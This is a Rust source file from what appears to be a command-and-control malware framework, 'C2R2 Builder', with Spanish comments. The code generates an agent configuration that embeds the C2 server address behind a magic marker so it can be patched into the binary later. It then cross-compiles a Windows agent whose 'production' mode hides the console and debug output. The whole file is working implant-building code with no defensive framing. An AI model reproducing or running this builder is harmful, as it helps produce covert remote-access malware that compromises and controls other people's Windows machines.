// File: builder/src/encrypt.rs
// v2.0 - Direct Connection (sin encriptación)

use std::fs::File;
use std::io::Write;
use std::process::Command;

pub fn generate_agent(
    output_name: &str,
    c2_server: &str,
    production: bool,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("🔧 Generando configuración del agente...");

    // Determine workspace root and agent path
    let (workspace_root, agent_relative_path) = if std::env::current_dir()?
        .to_string_lossy()
        .contains("target/release")
    {
        ("../../".to_string(), "../../agent".to_string())
    } else {
        (".".to_string(), "agent".to_string())
    };

    // Crear directorios si no existen
    let config_dir = format!("{}/src", agent_relative_path);
    std::fs::create_dir_all(&config_dir)?;

    // Generar config.rs con marcador para binary patching
    let config_file_path = format!("{}/src/config.rs", agent_relative_path);
    let mut config_file = File::create(&config_file_path)?;

    // Crear cadena con marcador + IP:PORT + padding nulo (total 96 bytes)
    // Marcador: 32 bytes + Dirección máxima: 64 bytes = 96 bytes total
    let marker = "C2R2_SERVER_ADDRESS_PLACEHOLDER_";
    let max_addr_len = 64;
    let padded_server = format!("{}{:\0<width$}", marker, c2_server, width = max_addr_len);

    writeln!(
        config_file,
        "// Generado automáticamente por C2R2 Builder v2.0"
    )?;
    writeln!(
        config_file,
        "// IMPORTANTE: Este archivo contiene un marcador para permitir binary patching sin recompilación\n"
    )?;
    writeln!(
        config_file,
        "// Dirección del servidor C2 con marcador mágico y padding para permitir reemplazo in-place"
    )?;
    writeln!(
        config_file,
        "// Formato: \"C2R2_SERVER_ADDRESS_PLACEHOLDER_\" + \"IP:PORT\" + padding nulo (total 96 bytes)"
    )?;
    writeln!(
        config_file,
        "// El marcador permite localizar esta cadena en el binario y reemplazar la IP sin recompilar"
    )?;
    writeln!(
        config_file,
        "// NOTA: Se usa #[used] y #[no_mangle] para evitar que el compilador elimine o optimice esta constante"
    )?;
    writeln!(
        config_file,
        "#[used]"
    )?;
    writeln!(
        config_file,
        "#[no_mangle]"
    )?;
    writeln!(
        config_file,
        "pub static C2_SERVER_PADDED: &[u8; 96] = b\"{}\";\n",
        padded_server
    )?;
    writeln!(
        config_file,
        "/// Obtiene la dirección del servidor C2 limpia (sin marcador ni padding)"
    )?;
    writeln!(
        config_file,
        "/// Esto extrae solo la parte \"IP:PORT\" después del marcador"
    )?;
    writeln!(
        config_file,
        "pub fn get_c2_server() -> &'static str {{"
    )?;
    writeln!(
        config_file,
        "    // El marcador tiene 32 bytes, después viene la IP:PORT"
    )?;
    writeln!(
        config_file,
        "    let without_marker = &C2_SERVER_PADDED[32..];"
    )?;
    writeln!(
        config_file,
        "    // Convertir bytes a str y remover padding nulo"
    )?;
    writeln!(
        config_file,
        "    let str_slice = std::str::from_utf8(without_marker).unwrap_or(\"\");"
    )?;
    writeln!(
        config_file,
        "    str_slice.trim_end_matches('\\0')"
    )?;
    writeln!(
        config_file,
        "}}\n"
    )?;
    writeln!(
        config_file,
        "// Para compatibilidad con código existente"
    )?;
    writeln!(
        config_file,
        "pub const C2_SERVER: &str = \"{}\";",
        c2_server
    )?;

    println!("✅ Configuración escrita en {}", config_file_path);
    println!("🌐 Servidor C2 configurado: {}", c2_server);

    // Compilar el agente con features apropiadas
    println!("🔨 Compilando agente para Windows...");
    
    let mut cargo_args = vec!["build", "--release", "--target", "x86_64-pc-windows-gnu", "-p", "agent"];
    
    // Agregar flags de feature según el modo
    if production {
        println!("🔒 Modo PRODUCCIÓN: sin consola, sin debug prints");
        cargo_args.push("--no-default-features");
        cargo_args.push("--features");
        cargo_args.push("production");
    } else {
        println!("🐛 Modo DESARROLLO: con consola y debug prints");
        // dev is default, no need to specify
    }
    
    let output = Command::new("cargo")
        .args(&cargo_args)
        .current_dir(&workspace_root)
        .output()?;

    if output.status.success() {
        println!("✅ Compilación exitosa!");
        let exe_path = format!(
            "{}/target/x86_64-pc-windows-gnu/release/agent.exe",
            workspace_root
        );
        println!("🏃 Ejecutable generado en {}", exe_path);

        // Copiar ejecutable
        let dest_path = format!("{}.exe", output_name);
        if std::fs::copy(&exe_path, &dest_path).is_ok() {
            println!("📦 Ejecutable copiado como: {}", dest_path);
        } else {
            println!(
                "⚠️  No se pudo copiar el ejecutable, está en: {}",
                exe_path
            );
        }
    } else {
        println!("❌ Error durante la compilación:");
        println!("STDERR: {}", String::from_utf8_lossy(&output.stderr));
        println!("STDOUT: {}", String::from_utf8_lossy(&output.stdout));
        return Err("Compilación fallida".into());
    }

    Ok(())
}
